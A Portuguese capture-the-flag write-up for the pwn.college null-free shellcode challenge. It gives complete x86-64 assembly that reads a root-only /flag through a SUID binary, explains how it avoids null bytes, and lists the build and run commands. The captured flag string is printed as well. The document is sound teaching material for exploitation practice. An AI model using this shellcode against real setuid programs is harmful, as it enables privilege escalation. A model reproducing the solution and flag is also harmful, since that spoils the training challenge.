# Writeup: pwn.college — Binary Exploitation: Null-Free Shellcode

## Descrição do Desafio

Similar aos desafios anteriores, o binário lê bytes do stdin e os executa como código. A diferença é que desta vez o programa **filtra qualquer null byte (`0x00`) do shellcode antes de executar** — ao encontrar um null byte, encerra a execução imediatamente.

```
This challenge requires that your shellcode have no NULL bytes!
Failed filter at byte 4!
```

O objetivo continua sendo ler `/flag`, cujas permissões são:

```
-r-------- 1 root root 58 /flag
```

E o binário tem SUID:

```
-rwsr-xr-x 1 root root /challenge/binary-exploitation-null-free-shellcode
```

---

## Abordagem 1: Shell interativo com `execve` (não funcionou)

A primeira tentativa foi um shellcode clássico que invoca `/bin/sh`. Não funcionou pelo mesmo motivo do desafio básico: o `/bin/sh` dropa o EUID ao iniciar, perdendo o privilégio de root necessário para ler `/flag`.

---

## Abordagem 2: Shellcode com open/read/write (ponto de partida)

A solução correta é fazer as syscalls diretamente, sem criar um novo processo, preservando o EUID=0. O shellcode base (sem preocupação com null bytes) ficou assim:

```asm
.global _start
_start:
.intel_syntax noprefix

    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rax, 0
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    mov rax, 1
    mov rdi, 1
    lea rsi, [rip + results]
    mov rdx, 0x100
    syscall

    mov rax, 60
    mov rdi, 0
    syscall

flag:
    .string "/flag"
results:
    .space 100
```

Ao compilar e extrair o `.text`:

```bash
gcc -nostdlib -static -o shellcode shellcode.s
objcopy --dump-section .text=shellcode-raw shellcode
cat shellcode-raw | /challenge/binary-exploitation-null-free-shellcode
```

O filtro encerrou imediatamente:

```
Failed filter at byte 4!
```

---

## Identificando os Null Bytes

### Ferramenta: `hd` (hexdump)

```bash
hd shellcode-raw
```

Analisando o hexdump, dois padrões de null bytes se repetem:

**Padrão 1 — `mov reg, imm` com imediato pequeno:**

```
48 c7 c0 02 00 00 00   →   mov rax, 0x2
```

A instrução `mov reg, imm64` espera 4 bytes para o imediato. Como `0x2` ocupa apenas 1 byte, o assembler preenche os 3 bytes restantes com `00 00 00`.

**Padrão 2 — `lea reg, [rip + offset]` com offset pequeno:**

```
48 8d 35 3d 00 00 00   →   lea rsi, [rip + 0x3d]
```

O campo de offset do `lea` também espera 4 bytes. Com `flag` e `results` posicionados *após* o `_start`, os offsets são pequenos e positivos — e os bytes altos ficam zerados.

---

## Eliminando os Null Bytes

### Caso 1: `mov reg, imm` → substituição por `xor` + `add`

```asm
# antes (com null bytes):
mov rax, 2          # 48 c7 c0 02 00 00 00

# depois (sem null bytes):
xor rax, rax        # 48 31 c0
add rax, 2          # 48 83 c0 02
```

O `add` com imediato de 8 bits (`48 83`) não precisa de extensão com zeros — usa apenas 1 byte para o valor.

Para `mov reg, 0`, basta usar `xor reg, reg`:

```asm
xor rsi, rsi    # em vez de mov rsi, 0
xor rdx, rdx    # em vez de mov rdx, 0
```

**Caso especial — `mov rdx, 0x100`:**

Trocar por `xor rdx, rdx; add rdx, 0x100` não resolve — o próprio `0x100` gera null bytes (`48 81 c2 00 01 00 00`). A solução foi usar o registrador `dh`, que é o segundo byte menos significativo de `rdx`:

```asm
xor rdx, rdx
mov dh, 0x1     # rdx = 0x0000000000000100, sem null bytes
```

`mov dh, 0x1` gera apenas `b6 01` — dois bytes, sem zeros.

### Caso 2: offsets pequenos no `lea` → mover dados para antes do `_start`

Com `flag` e `results` posicionados *após* o código, o `rip` precisa avançar para alcançá-los — offsets pequenos e positivos, com bytes altos zerados.

A solução foi mover `flag` e `results` para *antes* do `_start`. Assim o `rip` precisa *recuar* para alcançá-los — os offsets ficam negativos. Em complemento de 2, um offset negativo tem todos os bytes altos em `0xff`, sem nenhum null byte:

```
# antes (offset positivo pequeno):
48 8d 35 3d 00 00 00   →   lea rsi, [rip + 0x3d]      ← null bytes!

# depois (offset negativo):
48 8d 35 dd fe ff ff   →   lea rsi, [rip - 0x123]     ← sem null bytes!
```

O shellcode reorganizado:

```asm
.global _start

flag:
    .string "/flag"
results:
    .fill 0x200, 1, 0x90    # buffer de 0x200 bytes

_start:
.intel_syntax noprefix
    ...
```

---

## Problema Restante: null byte do `.string`

Após essas correções, o `objdump` não mostrava mais null bytes — mas o `hd shellcode-raw` ainda mostrava zeros logo após `/flag`:

```
00000060  2f 66 6c 61 67 00 00 00 ...
                         ^^
                         null byte do terminador de string
```

O `.string` em assembly **automaticamente adiciona `\0`** ao final da string — é o terminador C. Esse `\0` não aparece no `objdump` porque está na seção de dados e não é interpretado como instrução, mas está nos bytes brutos do shellcode e é filtrado pelo desafio.

### Tentativa: `.ascii` em vez de `.string`

Trocar `.string "/flag"` por `.ascii "/flag"` remove o terminador automático. Mas aí o `open()` não sabe onde a string termina — continua lendo a memória além de `/flag` até achar um zero qualquer, causando segfault.

### Solução: construir a string na stack em runtime

A ideia é não colocar `/flag` como dado estático no shellcode — em vez disso, construir a string na stack durante a execução. Bytes criados em runtime não são filtrados pelo desafio:

```
Filtro checa:   bytes do shellcode-raw (em tempo de load)
Null bytes OK:  dados criados em runtime (push, operações na stack)
```

O `push` em 64 bits sempre empurra 8 bytes. Como `/flag` tem apenas 5 bytes (`0x67616c662f`), os 3 bytes restantes precisam ser preenchidos com algo não-nulo. A solução foi usar `0x909090` como padding:

```asm
movabs rbx, 0x67616c662f909090   # "/flag" + 3 bytes de padding (0x90)
push rbx
```

Em little-endian, o layout na stack após o `push` é:

```
rsp   → 90 90 90 2f 66 6c 61 67
         padding  /  f  l  a  g
```

O `rsp` aponta para os bytes de padding. Para apontar `rdi` direto para o `/`, basta somar 3:

```asm
lea rdi, [rsp + 3]    # pula os 3 bytes de 0x90, aponta para '/'
```

Para o terminador: antes do `push rbx`, empurra 8 bytes nulos com `push rsi` (onde `rsi = 0`). Como a stack cresce para baixo, esses zeros ficam em endereços maiores — imediatamente após o `g` de `/flag`:

```
rsp+8 → 00 00 00 00 00 00 00 00   (push rsi — terminador \0)
rsp   → 90 90 90 2f 66 6c 61 67   (push rbx — padding + "/flag")
rsp+3 → 2f 66 6c 61 67 00 ...     ← rdi aponta aqui: "/flag\0" ✅
```

O `open()` lê a partir de `rdi`, encontra `/flag` e para no `\0` que veio do `push rsi`. Tudo em runtime, sem null bytes no shellcode.

---

## Shellcode Final

```asm
.global _start
.intel_syntax noprefix

buffer:
    .fill 0x200, 1, 0x90

_start:
    # open("/flag", O_RDONLY)
    xor rax, rax
    add rax, 2
    xor rsi, rsi
    push rsi                          # terminador \0 na stack
    movabs rbx, 0x67616c662f909090   # "/flag" + padding 0x909090
    push rbx
    lea rdi, [rsp + 3]               # pula o padding, aponta para '/'
    xor rsi, rsi
    xor rdx, rdx
    syscall

    # read(fd, buffer, 0xff)
    mov rdi, rax
    xor rax, rax
    xor rsi, rsi
    lea rsi, [rip + buffer]
    xor rdx, rdx
    mov dh, 0x1                      # rdx = 0x100 sem null bytes
    syscall

    # write(stdout, buffer, bytes_lidos)
    mov rdx, rax
    xor rax, rax
    inc rax
    xor rdi, rdi
    inc rdi
    lea rsi, [rip + buffer]
    syscall

    # exit(0)
    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall

    .fill 0x1000 - (. - buffer), 1, 0x90
```

### Compilação e execução

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
objcopy --dump-section .text=shellcode-raw shellcode-elf
python3 -c "
import sys
with open('shellcode-raw', 'rb') as f:
    sc = f.read()
padding = b'\x90' * (0x1000 - len(sc))
sys.stdout.buffer.write(sc + padding)
" | /challenge/binary-exploitation-null-free-shellcode
```

O script Python preenche o input até `0x1000` bytes com NOPs, garantindo que o binário não leia zeros além do shellcode.

---

## Resultado

```
pwn.college{Qc9ZoaHOQGM-jJgprLWp63G1P-E.dlTMywCOzYTNxEzW}
```

---

## Resumo das Técnicas

| Problema | Causa | Solução |
|---|---|---|
| `mov reg, imm` pequeno | Assembler preenche com zeros | `xor reg, reg` + `add reg, imm` |
| `mov rdx, 0x100` | `0x100` tem null byte | `mov dh, 0x1` |
| Offsets pequenos no `lea` | Dados após o código → offset positivo pequeno | Mover dados antes do `_start` → offset negativo |
| `.string` adiciona `\0` | Terminador automático de string C | Construir string na stack em runtime com `push` |
| Null bytes no padding final | Binário lê `0x1000` bytes, resto é zero | Preencher com NOPs via Python |

**Técnicas:** Null-free shellcode · Direct syscall shellcode · Position-independent shellcode · SUID privilege abuse · Stack string construction
